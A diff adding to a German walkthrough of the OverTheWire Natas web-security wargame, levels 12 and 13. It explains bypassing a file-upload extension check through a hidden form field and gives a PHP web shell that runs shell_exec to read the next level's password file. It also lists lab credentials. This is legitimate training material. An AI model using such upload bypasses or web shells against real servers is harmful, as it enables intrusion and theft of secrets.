@@ -209,3 +209,19 @@ Cookie mit `showpassword=yes`: `ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4s
 Zugriff:	[http://natas12.natas.labs.overthewire.org](http://natas12.natas.labs.overthewire.org)
 Username: `natas12`
 Passwort: `EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`
+
+Der Upload ist nicht auf JPG's beschränkt. Im hidden input der Form, kann `value` verändert werde. Der Name der Datei ist random, aber nicht die Dateiendung. Man kann hier ein eigenes php Skript hochladen, das das Passwort ausgibt.
+
+```php
+<?
+echo(shell_exec('cat /etc/natas_webpass/natas13'));
+?>
+```
+
+
+
+# Natas 13
+
+Zugriff:	[http://natas13.natas.labs.overthewire.org](http://natas13.natas.labs.overthewire.org)
+Username: `natas13`
+Passwort: `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY `
